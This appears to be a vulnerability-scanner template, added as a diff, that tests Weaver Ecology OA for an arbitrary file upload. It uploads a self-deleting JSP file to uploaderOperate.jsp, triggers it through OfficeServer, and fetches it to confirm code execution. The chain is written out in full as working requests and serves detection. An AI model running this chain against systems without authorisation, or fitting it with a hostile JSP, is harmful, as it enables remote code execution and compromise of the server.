@@ -1,0 +1,84 @@
+id: weaver-ecology-oa-uploaderoperate-writefile
+
+info:
+  name: Weaver Ecology OA Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template exploits an arbitrary file upload vulnerability in Weaver Ecology OA's uploaderOperate.jsp endpoint, allowing the creation of a temporary JSP file on the server. The vulnerability is validated by checking if the uploaded file can be executed successfully and includes self-deletion logic.
+
+variables:
+  s2: "{{rand_int(10000000, 90000000)}}"
+  s1: "{{rand_text_alpha(20)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/workrelate/plan/util/uploaderOperate.jsp"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryVdb2RRl25PuaGhWj"
+    body: |
+      ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+      Content-Disposition: form-data; name="secId"
+
+      1
+      ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+      Content-Disposition: form-data; name="Filedata"; filename="{{s1}}.jsp"
+
+      <% out.println("{{s2}}"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+      ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+      Content-Disposition: form-data; name="plandetailid"
+
+      1
+      ------WebKitFormBoundaryVdb2RRl25PuaGhWj--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "fileid=(.+?)>"
+    extractors:
+      - type: regex
+        name: fileid
+        regex:
+          - "fileid=(.+?)>"
+        group: 1
+
+  - id: trigger-insert-image
+    method: POST
+    path:
+      - "{{BaseURL}}/OfficeServer"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryVdb2RRl25PuaGhWj"
+    body: |
+      ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+      Content-Disposition: form-data; name="aaa"
+
+      {"OPTION":"INSERTIMAGE","isInsertImageNew":"1","imagefileid4pic":"{{fileid}}"}
+      ------WebKitFormBoundaryVdb2RRl25PuaGhWj--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{s2}}"
+        part: body
+
+  - id: validate-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/{{s1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{s2}}"
+        part: body
